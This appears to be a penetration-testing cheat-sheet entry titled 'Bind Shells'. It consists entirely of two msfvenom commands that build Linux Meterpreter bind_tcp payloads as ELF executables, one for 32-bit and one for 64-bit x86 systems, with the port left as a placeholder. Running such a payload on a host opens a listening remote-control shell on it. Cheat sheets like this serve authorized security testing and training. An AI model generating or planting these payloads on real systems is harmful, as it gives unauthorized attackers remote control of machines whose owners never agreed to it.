# Bind Shells

x86 (32-bit) payload.

```
$ msfvenom -p linux/x86/meterpreter/bind_tcp lport=<PORT> -f elf -o payload-x86
```

x86-64 (64-bit) payload.

```
$ msfvenom -p linux/x64/meterpreter/bind_tcp lport=<PORT> -f elf -o payload-x64
```